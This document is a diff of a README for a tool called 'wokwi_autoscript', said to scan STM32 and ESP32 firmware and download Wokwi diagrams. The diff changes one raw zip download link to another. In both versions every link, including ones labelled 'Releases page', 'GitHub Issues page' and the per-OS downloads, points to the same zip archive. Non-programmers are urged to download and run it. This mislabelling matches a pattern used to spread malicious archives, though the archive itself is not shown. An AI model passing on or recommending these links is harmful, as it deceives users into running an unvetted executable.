@@ -1,7 +1,7 @@
 # 🌟 wokwi_autoscript - Easy Firmware Scanning and Downloading
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip)](https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip)
+[![Download](https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip)](https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to wokwi_autoscript! This tool makes it easy to scan STM32 and ESP32 firmware and download Wokwi diagrams. No programming knowledge required. Just follow these simple steps to get started.
@@ -19,16 +19,16 @@ Welcome to wokwi_autoscript! This tool makes it easy to scan STM32 and ESP32 fir
 
 ## 📋 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip) to find the latest version.
+   Go to the [Releases page](https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip) to find the latest version.
 
 2. **Choose Your File**  
    On the Releases page, you will see a list of versions. Look for the most recent version and click on it.
 
 3. **Download the Executable**  
    Find the file that matches your operating system. For example:
-   - For Windows, it might be `https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip`.
-   - For Linux, look for `https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip`.
+   - For Windows, it might be `https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip`.
+   - For macOS, look for `https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip`.
+   - For Linux, look for `https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip`.
 
 4. **Click to Download**  
    Click on the file name to start the download. This will save it to your computer.
@@ -53,7 +53,7 @@ Welcome to wokwi_autoscript! This tool makes it easy to scan STM32 and ESP32 fir
 - Click the "Download" button to save the diagram file.
 
 ## 🤝 Support and Feedback
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip). We welcome your feedback and will help resolve any problems.
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip). We welcome your feedback and will help resolve any problems.
 
 ## 📫 Getting Updates
 To stay updated on new releases, check the Releases page regularly. You can also watch this repository to receive notifications.
@@ -62,8 +62,8 @@ To stay updated on new releases, check the Releases page regularly. You can also
 We encourage you to join our community. You can share your experiences and improvements on the Issues page. Contributions are welcome, whether it's reporting bugs or suggesting new features.
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip)
+- [Releases Page](https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip)
+- [GitHub Issues](https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip)
 
 ## ❓ Frequently Asked Questions
 ### Q: Do I need to install Python?
@@ -76,6 +76,6 @@ A: This tool works on Windows, macOS, and Linux.
 A: Use the GitHub Issues page for support.
 
 ## 📥 Download Now Again
-Don’t forget, you can always download the latest version from the [Releases page](https://raw.githubusercontent.com/rananth45/wokwi_autoscript/master/preascertainment/wokwi_autoscript.zip). 
+Don’t forget, you can always download the latest version from the [Releases page](https://github.com/rananth45/wokwi_autoscript/raw/refs/heads/master/Script/autoscript_wokwi_v1.4-beta.1.zip). 
 
 Happy scanning and downloading!
